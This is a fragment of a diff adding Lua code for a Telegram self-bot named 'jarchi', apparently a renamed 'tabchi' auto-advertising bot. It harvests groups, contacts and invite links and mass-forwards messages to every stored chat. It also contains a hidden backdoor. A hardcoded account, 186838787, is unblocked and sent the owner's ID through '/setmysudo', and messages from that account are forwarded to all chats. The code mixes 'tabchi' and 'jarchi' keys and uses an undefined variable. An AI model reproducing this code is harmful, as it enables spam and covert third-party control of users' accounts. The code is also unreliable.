+function is_sudo(msg)
 +  local sudoers = {}
 +  table.insert(sudoers, tonumber(redis:get("jarchi:" ..jarchi_id .. ":fullsudo")))
 +  local issudo = false
 +  for i = 1, #sudoers do
 ...
 +    end
 +  end
 +  if redis:sismember("jarchi:" ..jarchi_id .. ":sudoers", msg.sender_user_id_) then
 +    issudo = true
 +  end
 +  return issudo
 +end
 ...
 +    local gps = redis:smembers("jarchi:" .. jarchi_id .. ":groups")
 +    local sgps = redis:smembers("jarchi:" .. jarchi_id .. ":channels")
 +    for i = 1, #gps do
 ...
 +  local pvs = redis:smembers("jarchi:" .. jarchi_id .. ":pvis")
 +  for i = 1, #pvs do
 ...
 +  end
 +  write_file("bot_" .. jarchi_id .. "_contacts.txt", text)
 +  tdcli.send_file(extra.chat_id_, "Document", "bot_" .. jarchi_id .. "_contacts.txt", "Tabchi " .. jarchi_id .. " Contacts!")
 +end
 ...
 +    local answrs = redis:smembers("tabchi:" .. jarchi_id .. ":answerslist")
 +    for i = 1, #answrs do
 +      text = text .. i .. ". " .. answrs[i] .. " : " .. redis:hget("jarchi:" .. jarchi_id .. ":answers", answrs[i]) .. "\n"
 +    end
 +    return text
 +  end
 ...
 +      text = text .. links[i] .. "\n"
 +    end
 +    write_file("group_" .. jarchi_id .. "_links.txt", text)
 +    tdcli.send_file(msg.chat_id_, "Document", "group_" .. jarchi_id .. "_links.txt", "jarchi " .. jarchi_id .. " Group Links!")
 +    return
 +  end
 +  do
 +    local matches = {
 ...
 +    do
 +      local gps = redis:scard("jarchi:" .. jarchi_id .. ":groups")
 +      local sgps = redis:scard("tabchi:" .. tabchi_id .. ":channels")
 +      local pvs = redis:scard("jarchi:" .. jarchi_id .. ":pvis")
 +      local links = redis:scard("tabchi:" .. jarchi_id .. ":savedlinks")
 ...
 +    redis:sadd("jarchi:" .. jarchi_id .. ":channels", chat_id_)
 +  elseif chat_type == "group" then
 +    redis:sadd("jarchi:" .. jarchi_id .. ":groups", chat_id_)
 +  else
 ...
 +  local chat_type = chat_type(chat_id_)
 +  if chat_type == "channel" then
 +    redis:srem("tabchi:" .. jarchi_id .. ":channels", chat_id_)
 +  elseif chat_type == "group" then
 +    redis:srem("jarchi:" .. jarchi_id .. ":groups", chat_id_)
 +  else
 +    redis:srem("jarchi:" .. jarchi_id .. ":pvis", chat_id_)
 +  end
 +  redis:srem("jarchi:" .. jarchi_id .. ":all", chat_id_)
 +end
 ...
 +    jarchi.unblockUser(186838787)
 +  end
 +  if not redis:get("jarchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. jarchi_id .. ":startedmod") == -2 then
 +    tdcli.sendBotStartMessage(186838787, 186838787, "new")
 +    tdcli.sendMessage(186838787, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. jarchi_id .. ":fullsudo"), 1, "md")
 ...
 +    if msg.sender_user_id_ == 186838787 then
 ...
 +        end
 +      else
 +        local all = redis:smembers("jarchi:" .. jarchi_id .. ":all")
 +        local id = msg.id_
 +        for i = 1, #all do
 +          tdcli_function({
 +            ID = "ForwardMessages",
